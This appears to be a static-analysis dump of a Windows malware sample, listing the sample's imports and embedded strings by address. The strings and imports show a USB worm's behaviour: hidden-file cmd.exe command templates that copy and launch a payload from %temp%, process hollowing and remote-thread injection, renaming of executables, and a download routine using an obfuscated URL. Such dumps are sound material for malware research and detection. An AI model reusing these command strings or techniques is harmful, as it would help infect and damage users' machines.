reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4030a5	0x40114c	import	0x402f40	KERNEL32.dll.lstrcpynA
0x4030b9	0x401144	import	0x402f40	KERNEL32.dll.lstrcatA
0x4030e6	0x401158	import	0x402f40	KERNEL32.dll.FindNextFileA
0x4030fb	0x40115c	import	0x402f40	KERNEL32.dll.FindClose
0x403126	0x4013f8	string	0x403120	iphlpapi.dll
0x40312b	0x401138	import	0x403120	KERNEL32.dll.LoadLibraryA
0x403134	0x401408	string	0x403120	GetExtendedTcpTable
0x40313d	0x401164	import	0x403120	KERNEL32.dll.GetProcAddress
0x403146	0x40141c	string	0x403120	GetOwnerModuleFromTcpEntry
0x40314f	0x401164	import	0x403120	KERNEL32.dll.GetProcAddress
0x403158	0x40113c	import	0x403120	KERNEL32.dll.GetProcessHeap
0x40316f	0x401140	import	0x403120	KERNEL32.dll.VirtualAlloc
0x403186	0x401140	import	0x403120	KERNEL32.dll.VirtualAlloc
0x403273	0x401184	import	0x403120	KERNEL32.dll.Sleep
0x403309	0x401154	import	0x403290	KERNEL32.dll.lstrlenA
0x4033f1	0x401134	import	0x403290	KERNEL32.dll.CloseHandle
0x4033f9	0x401184	import	0x403290	KERNEL32.dll.Sleep
0x40353c	0x4014f8	string	0x403510	{A5DCBF10-6530-11D2-901F-00C04FB951ED}
0x403541	0x40121c	import	0x403510	ole32.dll.CLSIDFromString
0x403551	0x4011fc	import	0x403510	USER32.dll.RegisterDeviceNotificationA
0x4035bb	0x401134	import	0x403560	KERNEL32.dll.CloseHandle
0x4035df	0x4011f0	import	0x403560	USER32.dll.DestroyWindow
0x4035ef	0x4011ec	import	0x403560	USER32.dll.UnregisterDeviceNotification
0x4035f7	0x4011d4	import	0x403560	USER32.dll.PostQuitMessage
0x403611	0x4011d0	import	0x403560	USER32.dll.DefWindowProcA
0x40369d	0x401548	string	0x403690	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x4036cd	0x401154	import	0x403690	KERNEL32.dll.lstrlenA
0x403730	0x401068	import	0x403700	KERNEL32.dll.GetVolumeInformationA
0x403750	0x401584	string	0x403700	CoInitializeEx
0x403755	0x401594	string	0x403700	ole32.dll
0x40375a	0x401138	import	0x403700	KERNEL32.dll.LoadLibraryA
0x403761	0x401164	import	0x403700	KERNEL32.dll.GetProcAddress
0x40379a	0x401218	import	0x403700	ole32.dll.CoCreateInstance
0x4037eb	0x4015a0	string	0x403700	/c "%%SystemRoot%%\explorer.exe %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x4037f7	0x4011f4	import	0x403700	USER32.dll.wsprintfA
0x40381e	0x401648	string	0x403700	/c "start %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x40382a	0x4011f4	import	0x403700	USER32.dll.wsprintfA
0x403833	0x4016dc	string	0x403700	%ALLUSERSPROFILE%\..\..\windows\system32\cmd.exe
0x403865	0x401710	string	0x403700	%SystemRoot%\system32\SHELL32.dll
0x40387c	0x401734	string	0x403700	%SystemRoot%\system32\SHELL32.dll
0x4038be	0x401064	import	0x403700	KERNEL32.dll.SetFileAttributesW
0x4038c8	0x401060	import	0x403700	KERNEL32.dll.DeleteFileW
0x403914	0x40105c	import	0x403700	KERNEL32.dll.CreateFileW
0x40391a	0x401220	import	0x403700	ole32.dll.CoUninitialize
0x403940	0x401758	string	0x403930	BCDEFGHIJKLMNOPQRSTUVWXYZ
0x403954	0x401774	string	0x403930	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x40399d	0x4011ac	import	0x403930	SHELL32.dll.SHGetFolderPathA
0x4039aa	0x4017ac	string	0x403930	%s\c731200
0x4039b6	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x4039e1	0x401154	import	0x403930	KERNEL32.dll.lstrlenA
0x403a43	0x40108c	import	0x403930	KERNEL32.dll.GetDriveTypeA
0x403a8c	0x4017b8	string	0x403930	%s\c731200
0x403a98	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x403aad	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403aba	0x401084	import	0x403930	KERNEL32.dll.DeleteFileA
0x403ad9	0x401080	import	0x403930	KERNEL32.dll.CreateFileA
0x403af5	0x401134	import	0x403930	KERNEL32.dll.CloseHandle
0x403b02	0x401084	import	0x403930	KERNEL32.dll.DeleteFileA
0x403b3f	0x401068	import	0x403930	KERNEL32.dll.GetVolumeInformationA
0x403b65	0x4017c4	string	0x403930	.exe
0x403b71	0x401144	import	0x403930	KERNEL32.dll.lstrcatA
0x403b7e	0x4017cc	string	0x403930	%s\*
0x403b8a	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x403ba1	0x401148	import	0x403930	KERNEL32.dll.FindFirstFileA
0x403bc8	0x40107c	import	0x403930	KERNEL32.dll.lstrcmpA
0x403c4a	0x401150	import	0x403930	KERNEL32.dll.lstrcpyA
0x403c72	0x401154	import	0x403930	KERNEL32.dll.lstrlenA
0x403d07	0x4017d4	string	0x403930	%s\%s
0x403d13	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x403d2a	0x4017dc	string	0x403930	%s\%s
0x403d36	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x403d4d	0x401078	import	0x403930	KERNEL32.dll.MoveFileA
0x403d73	0x4017e4	string	0x403930	%s\%s.lnk
0x403d7f	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x403d96	0x4017f0	string	0x403930	%s\%s
0x403da2	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x403dab	0x4017f8	string	0x403930	.lnk
0x403db7	0x4011b8	import	0x403930	SHLWAPI.dll.StrStrA
0x403dcd	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403dda	0x401084	import	0x403930	KERNEL32.dll.DeleteFileA
0x403dea	0x401800	string	0x403930	.exe
0x403df6	0x4011b8	import	0x403930	SHLWAPI.dll.StrStrA
0x403e00	0x401808	string	0x403930	.pif
0x403e0c	0x4011b8	import	0x403930	SHLWAPI.dll.StrStrA
0x403e16	0x401810	string	0x403930	.scr
0x403e22	0x4011b8	import	0x403930	SHLWAPI.dll.StrStrA
0x403e2c	0x401818	string	0x403930	.cmd
0x403e38	0x4011b8	import	0x403930	SHLWAPI.dll.StrStrA
0x403e42	0x401820	string	0x403930	.com
0x403e4e	0x4011b8	import	0x403930	SHLWAPI.dll.StrStrA
0x403e5f	0x401074	import	0x403930	KERNEL32.dll.GetFileAttributesA
0x403e98	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403ea5	0x401084	import	0x403930	KERNEL32.dll.DeleteFileA
0x403ebb	0x401070	import	0x403930	KERNEL32.dll.CopyFileA
0x403ecf	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403ede	0x401154	import	0x403930	KERNEL32.dll.lstrlenA
0x403ef3	0x401154	import	0x403930	KERNEL32.dll.lstrlenA
0x403f05	0x40106c	import	0x403930	KERNEL32.dll.MultiByteToWideChar
0x403f3c	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403f4b	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403f5f	0x401158	import	0x403930	KERNEL32.dll.FindNextFileA
0x403f7b	0x401828	string	0x403930	%s\%s
0x403f87	0x4011f4	import	0x403930	USER32.dll.wsprintfA
0x403f9c	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403fa9	0x401084	import	0x403930	KERNEL32.dll.DeleteFileA
0x403fbf	0x401070	import	0x403930	KERNEL32.dll.CopyFileA
0x403fce	0x401088	import	0x403930	KERNEL32.dll.SetFileAttributesA
0x403fea	0x401080	import	0x403930	KERNEL32.dll.CreateFileA
0x404038	0x401090	import	0x404020	KERNEL32.dll.GetCurrentProcess
0x404079	0x40109c	import	0x404060	KERNEL32.dll.VirtualAllocEx
0x4040a3	0x40109c	import	0x404060	KERNEL32.dll.VirtualAllocEx
0x4040ce	0x401098	import	0x404060	KERNEL32.dll.WriteProcessMemory
0x4040eb	0x401098	import	0x404060	KERNEL32.dll.WriteProcessMemory
0x40410c	0x401094	import	0x404060	KERNEL32.dll.CreateRemoteThread
0x4042b1	0x4042bd	string	0x4042a0	jjjj
0x4042cf	0x401068	import	0x4042a0	KERNEL32.dll.GetVolumeInformationA
0x4042da	0x401830	string	0x4042a0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890123456789
0x40432d	0x4010a0	import	0x4042a0	KERNEL32.dll.GetTickCount
0x40436f	0x40187c	string	0x404350	HOMEDRIVE
0x404374	0x4010a8	import	0x404350	KERNEL32.dll.GetEnvironmentVariableA
0x40437a	0x401888	string	0x404350	\Program Files\
0x404386	0x401144	import	0x404350	KERNEL32.dll.lstrcatA
0x404397	0x401144	import	0x404350	KERNEL32.dll.lstrcatA
0x4043a9	0x401144	import	0x404350	KERNEL32.dll.lstrcatA
0x4043bd	0x401150	import	0x404350	KERNEL32.dll.lstrcpyA
0x4043cf	0x401144	import	0x404350	KERNEL32.dll.lstrcatA
0x4043e3	0x401148	import	0x404350	KERNEL32.dll.FindFirstFileA
0x404415	0x401150	import	0x404350	KERNEL32.dll.lstrcpyA
0x404429	0x401144	import	0x404350	KERNEL32.dll.lstrcatA
0x40443c	0x4011b8	import	0x404350	SHLWAPI.dll.StrStrA
0x404454	0x401150	import	0x404350	KERNEL32.dll.lstrcpyA
0x404467	0x401144	import	0x404350	KERNEL32.dll.lstrcatA
0x40447d	0x4010a4	import	0x404350	KERNEL32.dll.MoveFileExA
0x404491	0x401158	import	0x404350	KERNEL32.dll.FindNextFileA
0x4044a6	0x40115c	import	0x404350	KERNEL32.dll.FindClose
0x404506	0x4010ac	import	0x4044b0	KERNEL32.dll.lstrcmpiA
0x404539	0x4010ac	import	0x4044b0	KERNEL32.dll.lstrcmpiA
0x40457f	0x401134	import	0x4044b0	KERNEL32.dll.CloseHandle
0x4045a8	0x40117c	import	0x404590	KERNEL32.dll.CreateThread
0x4045d4	0x4010d8	import	0x404590	KERNEL32.dll.GetModuleFileNameW
0x4045da	0x4018a0	string	0x404590	IsWow64Process
0x4045df	0x4018b0	string	0x404590	kernel32.dll
0x4045e4	0x401160	import	0x404590	KERNEL32.dll.GetModuleHandleA
0x4045eb	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x4045f6	0x4018c0	string	0x404590	-aav_start
0x4045fb	0x4010d4	import	0x404590	KERNEL32.dll.GetCommandLineA
0x404602	0x4011b8	import	0x404590	SHLWAPI.dll.StrStrA
0x404616	0x4018cc	string	0x404590	-shell
0x40461b	0x4010d4	import	0x404590	KERNEL32.dll.GetCommandLineA
0x404622	0x4011b8	import	0x404590	SHLWAPI.dll.StrStrA
0x404632	0x40116c	import	0x404590	KERNEL32.dll.SetLastError
0x404638	0x4018d4	string	0x404590	Windows_Shared_Mutex_231_c000301
0x404641	0x401170	import	0x404590	KERNEL32.dll.CreateMutexA
0x40464c	0x401174	import	0x404590	KERNEL32.dll.GetLastError
0x40465b	0x401178	import	0x404590	KERNEL32.dll.ExitProcess
0x404670	0x401184	import	0x404590	KERNEL32.dll.Sleep
0x404685	0x4018f8	string	0x404590	CFlagc000301
0x4046b2	0x4010d0	import	0x404590	KERNEL32.dll.GetModuleFileNameA
0x4046db	0x40117c	import	0x404590	KERNEL32.dll.CreateThread
0x4046e1	0x40113c	import	0x404590	KERNEL32.dll.GetProcessHeap
0x404736	0x4011a8	import	0x404590	SHELL32.dll.SHGetFolderPathW
0x40475c	0x4010cc	import	0x404590	KERNEL32.dll.lstrcpyW
0x404762	0x401908	string	0x404590	\notepad.exe
0x40476c	0x4010c8	import	0x404590	KERNEL32.dll.lstrcatW
0x404772	0x401924	string	0x404590	SVCHOST_MUTEX_OBJECT_RELEASED_c000301
0x40477c	0x401150	import	0x404590	KERNEL32.dll.lstrcpyA
0x404782	0x40194c	string	0x404590	kernel32.dll
0x404787	0x401138	import	0x404590	KERNEL32.dll.LoadLibraryA
0x404790	0x40195c	string	0x404590	CreateProcessW
0x404799	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x4047a4	0x40196c	string	0x404590	GetProcessVersion
0x4047ad	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x4047b8	0x401980	string	0x404590	Sleep
0x4047c1	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x4047cc	0x401988	string	0x404590	CreateMutexA
0x4047d5	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x4047e0	0x401998	string	0x404590	ExitProcess
0x4047e9	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x4047f4	0x4019a4	string	0x404590	SetLastError
0x4047fd	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x404808	0x4019b4	string	0x404590	GetLastError
0x404811	0x401164	import	0x404590	KERNEL32.dll.GetProcAddress
0x404879	0x4019c4	string	0x404590	\svchost.exe
0x404885	0x4010c8	import	0x404590	KERNEL32.dll.lstrcatW
0x4048ae	0x401180	import	0x404590	KERNEL32.dll.CreateProcessW
0x4048df	0x4010c0	import	0x404590	KERNEL32.dll.FindResourceA
0x4048f4	0x4010bc	import	0x404590	KERNEL32.dll.LoadResource
0x404906	0x4010b8	import	0x404590	KERNEL32.dll.SizeofResource
0x404916	0x4010b4	import	0x404590	KERNEL32.dll.LockResource
0x40493d	0x4010b0	import	0x404590	KERNEL32.dll.VirtualProtect
0x404967	0x4010d8	import	0x404590	KERNEL32.dll.GetModuleFileNameW
0x404982	0x401178	import	0x404590	KERNEL32.dll.ExitProcess
0x4049d9	0x4010e8	import	0x404990	KERNEL32.dll.GetCommandLineW
0x4049e4	0x401180	import	0x404990	KERNEL32.dll.CreateProcessW
0x404a05	0x4019e4	string	0x404990	NtUnmapViewOfSection
0x404a0a	0x4019fc	string	0x404990	ntdll.dll
0x404a0f	0x401160	import	0x404990	KERNEL32.dll.GetModuleHandleA
0x404a16	0x401164	import	0x404990	KERNEL32.dll.GetProcAddress
0x404a5a	0x40109c	import	0x404990	KERNEL32.dll.VirtualAllocEx
0x404a81	0x401098	import	0x404990	KERNEL32.dll.WriteProcessMemory
0x404aee	0x401098	import	0x404990	KERNEL32.dll.WriteProcessMemory
0x404b0e	0x4010e4	import	0x404990	KERNEL32.dll.GetThreadContext
0x404b33	0x401098	import	0x404990	KERNEL32.dll.WriteProcessMemory
0x404b5f	0x4010e0	import	0x404990	KERNEL32.dll.SetThreadContext
0x404b6c	0x4010dc	import	0x404990	KERNEL32.dll.ResumeThread
0x404bc4	0x4011ac	import	0x404b80	SHELL32.dll.SHGetFolderPathA
0x404bd1	0x401a08	string	0x404b80	%s\c731200
0x404bdd	0x4011f4	import	0x404b80	USER32.dll.wsprintfA
0x404c0a	0x4010d0	import	0x404b80	KERNEL32.dll.GetModuleFileNameA
0x404c1c	0x401088	import	0x404b80	KERNEL32.dll.SetFileAttributesA
0x404c29	0x401084	import	0x404b80	KERNEL32.dll.DeleteFileA
0x404c3f	0x401070	import	0x404b80	KERNEL32.dll.CopyFileA
0x404c7e	0x4011ac	import	0x404c50	SHELL32.dll.SHGetFolderPathA
0x404c84	0x401a14	string	0x404c50	\ScreenSaverPro.scr
0x404c90	0x401144	import	0x404c50	KERNEL32.dll.lstrcatA
0x404ca2	0x401088	import	0x404c50	KERNEL32.dll.SetFileAttributesA
0x404caf	0x401084	import	0x404c50	KERNEL32.dll.DeleteFileA
0x404cda	0x4011ac	import	0x404c50	SHELL32.dll.SHGetFolderPathA
0x404ce0	0x401a28	string	0x404c50	\temp.bin
0x404cec	0x401144	import	0x404c50	KERNEL32.dll.lstrcatA
0x404cfe	0x401088	import	0x404c50	KERNEL32.dll.SetFileAttributesA
0x404d0b	0x401084	import	0x404c50	KERNEL32.dll.DeleteFileA
0x404d6f	0x4010ec	import	0x404d20	KERNEL32.dll.VirtualQuery
0x404d7b	0x401a34	string	0x404d20	user32.dll
0x404d80	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404d86	0x401a40	string	0x404d20	advapi32.dll
0x404d8b	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404d91	0x401a50	string	0x404d20	shell32.dll
0x404d96	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404d9c	0x401a5c	string	0x404d20	urlmon.dll
0x404da1	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404da7	0x401a68	string	0x404d20	wininet.dll
0x404dac	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404db2	0x401a74	string	0x404d20	gdi32.dll
0x404db7	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404dbd	0x401a80	string	0x404d20	rpcrt4.dll
0x404dc2	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404dc8	0x401a8c	string	0x404d20	netapi32.dll
0x404dcd	0x401138	import	0x404d20	KERNEL32.dll.LoadLibraryA
0x404e03	0x401a9c	string	0x404d20	USBProc
0x404e11	0x4010a0	import	0x404d20	KERNEL32.dll.GetTickCount
0x404e33	0x4011dc	import	0x404d20	USER32.dll.RegisterClassA
0x404e5b	0x401aa8	string	0x404d20	USBProc
0x404e62	0x4011d8	import	0x404d20	USER32.dll.CreateWindowExA
0x404e7f	0x4011cc	import	0x404d20	USER32.dll.GetMessageA
0x404e8d	0x401204	import	0x404d20	USER32.dll.TranslateMessage
0x404e97	0x4011f8	import	0x404d20	USER32.dll.DispatchMessageA
0x404eda	0x4010f8	import	0x404eb0	KERNEL32.dll.IsBadReadPtr
0x404efc	0x40109c	import	0x404eb0	KERNEL32.dll.VirtualAllocEx
0x404f1c	0x401140	import	0x404eb0	KERNEL32.dll.VirtualAlloc
0x405039	0x401098	import	0x404eb0	KERNEL32.dll.WriteProcessMemory
0x405055	0x4010f4	import	0x404eb0	KERNEL32.dll.VirtualFree
0x405070	0x4010f0	import	0x404eb0	KERNEL32.dll.VirtualFreeEx
0x4050b1	0x4010ec	import	0x405090	KERNEL32.dll.VirtualQuery
0x405109	0x401094	import	0x4050c0	KERNEL32.dll.CreateRemoteThread
0x405128	0x4010fc	import	0x4050c0	KERNEL32.dll.WaitForSingleObject
0x405175	0x401150	import	0x405140	KERNEL32.dll.lstrcpyA
0x405182	0x401154	import	0x405140	KERNEL32.dll.lstrlenA
0x4051dc	0x401ab4	string	0x405140	*.exe
0x4051e1	0x401148	import	0x405140	KERNEL32.dll.FindFirstFileA
0x405209	0x40107c	import	0x405140	KERNEL32.dll.lstrcmpA
0x405237	0x401150	import	0x405140	KERNEL32.dll.lstrcpyA
0x40523d	0x401abc	string	0x405140	.gonewiththewings
0x405249	0x401144	import	0x405140	KERNEL32.dll.lstrcatA
0x40525f	0x4010a4	import	0x405140	KERNEL32.dll.MoveFileExA
0x405271	0x401088	import	0x405140	KERNEL32.dll.SetFileAttributesA
0x405285	0x401158	import	0x405140	KERNEL32.dll.FindNextFileA
0x4052b0	0x401ad0	string	0x4052a0	*.gonewiththewings
0x4052b5	0x401148	import	0x4052a0	KERNEL32.dll.FindFirstFileA
0x4052d3	0x401084	import	0x4052a0	KERNEL32.dll.DeleteFileA
0x4052e7	0x401158	import	0x4052a0	KERNEL32.dll.FindNextFileA
0x40532e	0x4011ac	import	0x405300	SHELL32.dll.SHGetFolderPathA
0x405334	0x401ae4	string	0x405300	\Microsoft
0x405340	0x401144	import	0x405300	KERNEL32.dll.lstrcatA
0x40534d	0x401104	import	0x405300	KERNEL32.dll.SetCurrentDirectoryA
0x40537f	0x401100	import	0x405300	KERNEL32.dll.GetTempPathA
0x40538c	0x401104	import	0x405300	KERNEL32.dll.SetCurrentDirectoryA
0x405551	0x401154	import	0x405540	KERNEL32.dll.lstrlenA
0x405563	0x401150	import	0x405540	KERNEL32.dll.lstrcpyA
0x405d0b	0x401af0	string	0x405d00	kernel32.dll
0x405d10	0x401160	import	0x405d00	KERNEL32.dll.GetModuleHandleA
0x405d2b	0x401b00	string	0x405d00	abcdefghijklmnopqrstuvwxyz0123456789
0x405d46	0x40116c	import	0x405d00	KERNEL32.dll.SetLastError
0x405d4c	0x401b28	string	0x405d00	SSLOADasdasc000301
0x405d55	0x401170	import	0x405d00	KERNEL32.dll.CreateMutexA
0x405d5b	0x401174	import	0x405d00	KERNEL32.dll.GetLastError
0x405d6a	0x40110c	import	0x405d00	KERNEL32.dll.ExitThread
0x405dc6	0x401b3c	string	0x405d00	CloseHandle
0x405dd2	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405dde	0x401b48	string	0x405d00	CreateFileA
0x405dea	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405df6	0x401b54	string	0x405d00	DeleteFileA
0x405e02	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405e0e	0x401b60	string	0x405d00	ExitProcess
0x405e1a	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405e26	0x401b6c	string	0x405d00	GetFileSize
0x405e32	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405e3e	0x401b78	string	0x405d00	GetProcAddress
0x405e4a	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405e56	0x401b88	string	0x405d00	GetSystemTime
0x405e62	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405e6e	0x401b98	string	0x405d00	GetTempPathA
0x405e7a	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405e86	0x401ba8	string	0x405d00	LoadLibraryA
0x405e92	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405e9e	0x401bb8	string	0x405d00	lstrcatA
0x405eaa	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405eb6	0x401bc4	string	0x405d00	lstrlenA
0x405ec2	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405ece	0x401bd0	string	0x405d00	ReadFile
0x405eda	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405ee6	0x401bdc	string	0x405d00	SetFileAttributesA
0x405ef2	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405efe	0x401bf0	string	0x405d00	WinExec
0x405f0a	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405f16	0x401bf8	string	0x405d00	WriteFile
0x405f22	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405f2e	0x401c04	string	0x405d00	Sleep
0x405f3a	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405f46	0x401c0c	string	0x405d00	GetLastError
0x405f52	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405f5e	0x401c1c	string	0x405d00	CreateMutexA
0x405f6a	0x401164	import	0x405d00	KERNEL32.dll.GetProcAddress
0x405f82	0x401100	import	0x405d00	KERNEL32.dll.GetTempPathA
0x405f88	0x401c2c	string	0x405d00	c731200
0x405f94	0x401144	import	0x405d00	KERNEL32.dll.lstrcatA
0x405fa6	0x401100	import	0x405d00	KERNEL32.dll.GetTempPathA
0x405fb8	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x405fbe	0x401c38	string	0x405d00	user32.dll
0x405fca	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x405fd0	0x401c44	string	0x405d00	urlmon.dll
0x405fdc	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x405fe2	0x401c50	string	0x405d00	wsprintfA
0x405fee	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x405ff4	0x401c5c	string	0x405d00	URLDownloadToFileA
0x406000	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x406006	0x401c70	string	0x405d00	wininet.dll
0x406012	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x406018	0x401c7c	string	0x405d00	InternetCheckConnectionA
0x406024	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x40602a	0x401c98	string	0x405d00	http://www.google.com
0x406036	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x406043	0x4010a0	import	0x405d00	KERNEL32.dll.GetTickCount
0x4060a7	0x401154	import	0x405d00	KERNEL32.dll.lstrlenA
0x4060c7	0x401cb0	string	0x405d00	.exe
0x4060d3	0x401144	import	0x405d00	KERNEL32.dll.lstrcatA
0x4060ee	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x4060f9	0x401cb8	string	0x405d00	c731200
0x406105	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
0x40610b	0x401cc0	string	0x405d00	9EEAi^^?2A:`]H:A>2?:2]4@>]H:A>D4]CF^?2A:`]8:7
0x406117	0x401150	import	0x405d00	KERNEL32.dll.lstrcpyA
